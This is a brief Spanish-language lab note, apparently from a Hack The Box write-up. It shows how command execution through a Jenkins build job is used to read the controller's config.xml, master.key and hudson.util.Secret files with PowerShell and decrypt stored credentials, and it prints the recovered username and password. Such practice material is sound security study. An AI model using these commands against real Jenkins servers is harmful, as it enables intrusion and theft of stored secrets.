# jenkins

# Jenkins

## Inyectar comando al construir proyecto

![https://rubbxalc.github.io/writeups/assets/img/Object-htb/4.png](https://rubbxalc.github.io/writeups/assets/img/Object-htb/4.png)

image

Es necesario agregar una tarea para que se ejecute cada cierto tiempo (En este caso, cada minuto)

![https://rubbxalc.github.io/writeups/assets/img/Object-htb/5.png](https://rubbxalc.github.io/writeups/assets/img/Object-htb/5.png)

image

Una vez se ha compilado, se puede ver el output del comando que he indicado

![https://rubbxalc.github.io/writeups/assets/img/Object-htb/6.png](https://rubbxalc.github.io/writeups/assets/img/Object-htb/6.png)

image

En caso de no querer esperar a que se ejecute la tarea, existe una alternativa. Creo un token desde los ajustes de la cuenta a la que previamente tenía acceso

![https://rubbxalc.github.io/writeups/assets/img/Object-htb/8.png](https://rubbxalc.github.io/writeups/assets/img/Object-htb/8.png)

image

Con `curl` construyo el proyecto

```
curl -s -X GET 'http://rubbx:11a8956263bda19798dacf5911460d759c@10.10.11.132:8080/job/Testing/build?token=rubbx
```

## Obtener credenciales

En caso de poder ejecutar comandos, es necesario traer tres archivos, el `config.xml`, `master.key` y `hudson.util.Secret`

```
cmd /c powershell -c type ..\..\users\admin_17207690984073220035\config.xml
```

```
cmd /c powershell -c type ..\..\secrets\master.key
```

El último al ser un binario hay que traerlo en base64 para posteriormente hacer un decode

```
cmd /c powershell -c [convert]::ToBase64String((Get-Content -path "..\..\secrets\hudson.util.Secret" -Encoding byte))
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Testing>cmd /c powershell -c [convert]::ToBase64String((Get-Content -path "..\..\secrets\hudson.util.Secret" -Encoding byte))
```

La herramienta necesaria se encuentra en [Github](https://github.com/hoto/jenkins-credentials-decryptor)

```
./jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml
[
  {
    "id": "320a60b9-1e5c-4399-8afe-44466c9cde9e",
    "password": "c1cdfun_d2434\u0003\u0003\u0003",
    "username": "oliver"
  }
]
```